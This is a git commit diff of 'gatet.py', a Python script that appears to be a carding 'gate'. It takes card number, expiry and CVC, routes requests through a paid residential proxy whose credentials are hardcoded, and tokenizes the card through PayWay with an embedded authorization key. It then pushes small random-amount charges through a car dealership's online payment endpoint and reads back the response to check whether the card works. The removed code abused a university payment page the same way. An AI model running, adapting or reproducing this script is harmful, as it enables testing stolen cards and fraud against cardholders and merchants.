726d544f73ef523a99b7d409831a5cbe596b4d45
Rodamuser08 <rodamuser08@gmail.com>
2025-05-29 02:28:48 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -1,4 +1,5 @@
 import requests,re
+import random
 from proxy import reqproxy, make_request
 def Tele(ccx):
 	proxy_str = "bd.porterproxies.com:8888:user-PP_FBBG3PY7GO-country-US-plan-luminati:nsugwlie"
@@ -13,161 +14,79 @@ def Tele(ccx):
 		yy = yy.split("20")[1]
 	r = requests.session()
 
+	random_amount1 = random.randint(1, 9)
+	random_amount2 = random.randint(1, 99)
+	
 	headers = {
-	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'Cache-Control': 'max-age=0',
-	    'Connection': 'keep-alive',
-	    'Referer': 'https://www.google.com/',
-	    'Sec-Fetch-Dest': 'document',
-	    'Sec-Fetch-Mode': 'navigate',
-	    'Sec-Fetch-Site': 'cross-site',
-	    'Sec-Fetch-User': '?1',
-	    'Upgrade-Insecure-Requests': '1',
-	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	    'authority': 'api.payway.com.au',
+	    'accept': 'application/json',
+	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'authorization': 'Basic UTQwNzcxX1BVQl9ycmVlNzNzZXp3aHNxdWNtZ2twNzIyNmQ0cXB2ZGhiaWhqNnJ0ZXViMmg5Mnh1YXduNDk2NDZtM2VkOGs6',
+	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	    'origin': 'https://api.payway.com.au',
+	    'referer': 'https://api.payway.com.au/rest/v1/creditCard-iframe.htm',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-origin',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	    'x-no-authenticate-basic': 'true',
+	    'x-requested-with': 'XMLHttpRequest',
 	}
 	
-	response = session.get('https://www.stleos.uq.edu.au/make-a-payment-bpoint/', headers=headers)
-	
-	authorization = re.search(r'"authorization":"(.*?)"', response.text).group(1)
-	#print(authorization)
-	billerCode = re.search(r'name="billerCode" value="(.*?)"', response.text).group(1)
-	#print(billerCode)
-	
-	headers = {
-	    'Accept': '*/*',
-	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'Authorization': f'{authorization}',
-	    'Connection': 'keep-alive',
-	    'Content-Type': 'application/json',
-	    'Origin': 'https://www.stleos.uq.edu.au',
-	    'Referer': 'https://www.stleos.uq.edu.au/make-a-payment-bpoint/',
-	    'Sec-Fetch-Dest': 'empty',
-	    'Sec-Fetch-Mode': 'cors',
-	    'Sec-Fetch-Site': 'cross-site',
-	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
-	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
+	data = {
+	    'paymentMethod': 'creditCard',
+	    'connectionType': 'FRAME',
+	    'cardNumber': f'{n}',
+	    'cvn': f'{cvc}',
+	    'cardholderName': 'Dao Khao Saard',
+	    'expiryDateMonth': f'{mm}',
+	    'expiryDateYear': f'{yy}',
+	    'threeDS2': 'false',
 	}
 	
-	response = session.post('https://www.bpoint.com.au/rest/v5/txns/authkeys', headers=headers)
+	response = session.post('https://api.payway.com.au/rest/v1/single-use-tokens', headers=headers, data=data)
 	
-	authkey = response.json()['authkey']
-	#print(authkey)
+	token = response.json()['singleUseTokenId']
+	#print(token)
 	
 	headers = {
-	    'Accept': '*/*',
-	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'Authorization': f'{authorization}',
-	    'Connection': 'keep-alive',
-	    'Content-Type': 'application/json',
-	    'Origin': 'https://www.stleos.uq.edu.au',
-	    'Referer': 'https://www.stleos.uq.edu.au/make-a-payment-bpoint/',
-	    'Sec-Fetch-Dest': 'empty',
-	    'Sec-Fetch-Mode': 'cors',
-	    'Sec-Fetch-Site': 'cross-site',
-	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	    'authority': 'www.penfold.com.au',
+	    'accept': '*/*',
+	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'content-type': 'application/json',
+	    'origin': 'https://www.penfold.com.au',
+	    'referer': 'https://www.penfold.com.au/online-payment',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-origin',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
 	json_data = {
-	    'action': 'Payment',
-	    'type': 'ECommerce',
-	    'subType': 'Single',
-	    'amount': 100,
-	    'billerCode': f'{billerCode}',
-	    'crn1': '1',
-	    'crn2': '',
-	    'crn3': '',
-	    'merchantReference': '',
-	    'currency': 'AUD',
-	    'bypass3ds': False,
-	    'tokenisationMode': 'Default',
-	    'emailAddress': '',
-	    'storeCard': True,
-	    'testMode': False,
-	}
-	
-	response = session.put(
-	    f'https://www.bpoint.com.au/rest/v5/txns/authkeys/{authkey}/txn-details',
-	    headers=headers,
-	    json=json_data,
-	)
-	
-	headers = {
-	    'Accept': '*/*',
-	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'Connection': 'keep-alive',
-	    'Content-type': 'application/json',
-	    'Origin': 'https://www.stleos.uq.edu.au',
-	    'Referer': 'https://www.stleos.uq.edu.au/make-a-payment-bpoint/',
-	    'Sec-Fetch-Dest': 'empty',
-	    'Sec-Fetch-Mode': 'cors',
-	    'Sec-Fetch-Site': 'cross-site',
-	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
-	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	}
-	
-	json_data = {
-	    'card': {
-	        'number': n,
-	        'expiry': {
-	            'month': f'{mm}',
-	            'year': yy,
-	        },
-	        'name': 'Dao Khao Saard',
-	        'cvn': f'{cvc}',
+	    'dealership_slug': '559',
+	    'custom_amount': f'{random_amount1}.{random_amount2}',
+	    'customer': {
+	        'email': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
 	    },
-	}
-	
-	response = session.put(
-	    f'https://www.bpoint.com.au/rest/v5/txns/authkeys/{authkey}/client/payment-method',
-	    headers=headers,
-	    json=json_data,
-	)
-	
-	headers = {
-	    'Accept': '*/*',
-	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'Authorization': f'{authorization}',
-	    'Connection': 'keep-alive',
-	    'Content-Type': 'application/json',
-	    'Origin': 'https://www.stleos.uq.edu.au',
-	    'Referer': 'https://www.stleos.uq.edu.au/make-a-payment-bpoint/',
-	    'Sec-Fetch-Dest': 'empty',
-	    'Sec-Fetch-Mode': 'cors',
-	    'Sec-Fetch-Site': 'cross-site',
-	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
-	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	}
-	
-	json_data = {
-	    'webhook': {
-	        'url': 'https://stleo.wtdevsite.com/make-a-payment-bpoint/',
-	        'version': '5',
+	    'token': f'{token}',
+	    'merchant_id': '6870786',
+	    'order': {
+	        'number': '1285482',
 	    },
-	    'surcharge': {
-	        'calculate': False,
-	        'amount': 0,
-	    },
-	    'updateToken': True,
 	}
 	
 	response = session.post(
-	    f'https://www.bpoint.com.au/rest/v5/txns/authkeys/{authkey}/process',
+	    'https://www.penfold.com.au/api/frizelle-st-george-payment',
 	    headers=headers,
 	    json=json_data,
 	)
 	
 	result = re.search(r'"responseText":"(.*?)"', response.text).group(1)
+	
 	return (result)
